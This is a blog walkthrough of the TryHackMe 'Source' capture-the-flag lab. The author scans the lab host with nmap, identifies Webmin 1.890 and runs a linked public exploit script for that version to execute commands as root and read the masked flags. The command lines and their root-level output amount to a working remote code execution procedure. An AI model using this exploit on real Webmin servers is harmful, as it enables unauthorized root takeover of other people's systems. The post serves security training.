---
title: "TryHackMe: Source"
author: cilgin
date: 2025-06-21 19:48:40 +0300
categories: [CyberSecurity]
tags: [CTF, TryHackMe, Easy]
pin: true
math: false
mermaid: false
image:
  path: /assets/img/2025-06-21-TryHackMe-Source/Source.png
---

# Enumeration

## Nmap Scan

I start with exporting the target machine IP adress as a enviroment variable:

```bash
export IP=10.10.178.7
```

And running `nmap` scan on the target:

```bash
❯ nmap -T4 -n -sC -sV -Pn -p- $IP
Starting Nmap 7.97 ( https://nmap.org ) at 2025-06-21 19:50 +0300
Nmap scan report for 10.10.178.7
Host is up (0.073s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 b7:4c:d0:bd:e2:7b:1b:15:72:27:64:56:29:15:ea:23 (RSA)
|   256 b7:85:23:11:4f:44:fa:22:00:8e:40:77:5e:cf:28:7c (ECDSA)
|_  256 a9:fe:4b:82:bf:89:34:59:36:5b:ec:da:c2:d3:95:ce (ED25519)
10000/tcp open  http    MiniServ 1.890 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
|_http-server-header: MiniServ/1.890
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 80.66 seconds
```

There is a open port `10000` for http running Webmin. So I `curl` the page first.

```bash
❯ curl http://$IP:10000
<h1>Error - Document follows</h1>
<p>This web server is running in SSL mode. Try the URL <a href='https://ip-10-10-178-7.eu-west-1.compute.internal:10000/'>https://ip-10-10-178-7.eu-west-1.compute.internal:10000/</a> instead.<br></p>
```

But site is not working on http so I try http.

```bash
❯ curl https://$IP:10000
curl: (60) SSL certificate problem: self-signed certificate
More details here: https://curl.se/docs/sslcerts.html

curl failed to verify the legitimacy of the server and therefore could not
establish a secure connection to it. To learn more about this situation and
how to fix it, please visit the webpage mentioned above.
```

And It's using self-signed certificates. I guess using browser is better from there.
So I hop into my browser and go the path with https.
![Desktop View](/assets/img/2025-06-21-TryHackMe-Source/photo1.png){: width="972" height="589" }

## Trying to log in as a admin

Like everyone I tried:

- admin:admin
- admin:password

But these didn't worked out. So I googled the default password for `webmin`.

Someone on the forums said this:

```text
The default user name and password is that of your root user.
```

After that I checked webmin version the server was runnning:

```text
|_http-server-header: MiniServ/1.890
```

And googled the version for any CVE's. And I found one, also found a script that exploits that security vulnerability. Here's the github repo for the script: <https://github.com/n0obit4/Webmin_1.890-POC/blob/master/Webmin_exploit.py>

```bash
❯ python script.py -host $IP -port 10000 -cmd id

╦ ╦┌─┐┌┐ ┌┬┐┬┌┐┌
║║║├┤ ├┴┐│││││││
╚╩╝└─┘└─┘┴ ┴┴┘└┘ 1.890 expired Remote Root

			By: n0obit4
			Github: https://github.com/n0obit4
Your password has expired, and a new one must be chosen.
uid=0(root) gid=0(root) groups=0(root)
```

And we got access with root.

## Gaining Flags

For user:

```bash
❯ python script.py -host $IP -port 10000 -cmd "ls /home"

╦ ╦┌─┐┌┐ ┌┬┐┬┌┐┌
║║║├┤ ├┴┐│││││││
╚╩╝└─┘└─┘┴ ┴┴┘└┘ 1.890 expired Remote Root

			By: n0obit4
			Github: https://github.com/n0obit4
Your password has expired, and a new one must be chosen.
dark


~/dev/Python via  v3.13.3 (myenv)
❯ python script.py -host $IP -port 10000 -cmd "ls /home/dark"

╦ ╦┌─┐┌┐ ┌┬┐┬┌┐┌
║║║├┤ ├┴┐│││││││
╚╩╝└─┘└─┘┴ ┴┴┘└┘ 1.890 expired Remote Root

			By: n0obit4
			Github: https://github.com/n0obit4
Your password has expired, and a new one must be chosen.
user.txt
webmin_1.890_all.deb


~/dev/Python via  v3.13.3 (myenv)
❯ python script.py -host $IP -port 10000 -cmd "cat /home/dark/user.txt"

╦ ╦┌─┐┌┐ ┌┬┐┬┌┐┌
║║║├┤ ├┴┐│││││││
╚╩╝└─┘└─┘┴ ┴┴┘└┘ 1.890 expired Remote Root

			By: n0obit4
			Github: https://github.com/n0obit4
Your password has expired, and a new one must be chosen.
THM{*******************}
```

For root:

```bash
❯ python script.py -host $IP -port 10000 -cmd "cat /root/root.txt"

╦ ╦┌─┐┌┐ ┌┬┐┬┌┐┌
║║║├┤ ├┴┐│││││││
╚╩╝└─┘└─┘┴ ┴┴┘└┘ 1.890 expired Remote Root

			By: n0obit4
			Github: https://github.com/n0obit4
Your password has expired, and a new one must be chosen.
THM{*******************}
```

Easy as that. Thanks you for reading my solution.
